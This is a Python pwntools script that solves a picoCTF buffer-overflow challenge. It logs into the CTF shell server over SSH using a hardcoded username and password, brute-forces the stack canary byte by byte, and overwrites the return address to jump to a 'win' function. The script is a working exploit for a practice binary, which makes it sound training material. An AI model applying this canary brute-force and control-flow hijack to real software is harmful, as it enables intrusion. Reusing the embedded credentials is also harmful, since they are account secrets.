from pwn import *

s = ssh(host='2018shell1.picoctf.com', user='inertfluid', password='jCaJJ6e6CYxvg6p')
s.set_working_directory('/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f')

padding = 'A'*32
for i in range(0x100):
	p = s.process('./vuln')
	canary_1 = i
	exploit = padding + p8(i)
	p.sendline(str(len(exploit)))
	p.sendline(exploit)
	d = p.recvall()
	if d[56]!='*':
		print canary_1
		break

for i in range(0x100):
	p = s.process('./vuln')
	canary_2 = i
	exploit = padding + p8(canary_1) + p8(canary_2)
	p.sendline(str(len(exploit)))
	p.sendline(exploit)
	d = p.recvall()
	if d[56]!='*':
		print canary_2
		break

for i in range(0x100):
	p = s.process('./vuln')
	canary_3 = i
	exploit = padding + p8(canary_1) + p8(canary_2) + p8(canary_3)
	p.sendline(str(len(exploit)))
	p.sendline(exploit)
	d = p.recvall()
	if d[56]!='*':
		print canary_3
		break

for i in range(0x100):
	p = s.process('./vuln')
	canary_4 = i
	exploit = padding + p8(canary_1) + p8(canary_2) + p8(canary_3) + p8(canary_4)
	p.sendline(str(len(exploit)))
	p.sendline(exploit)
	d = p.recvall()
	if d[56]!='*':
		print canary_4
		break

win = 0x080486eb
p = s.process('./vuln')
exploit = padding + p8(canary_1) + p8(canary_2) + p8(canary_3) + p8(canary_4) + 'AAAAAAAAAAAAAAAA' + p32(win) 	
p.sendline(str(len(exploit)))
p.sendline(exploit)
d = p.recvall()
print d		
			

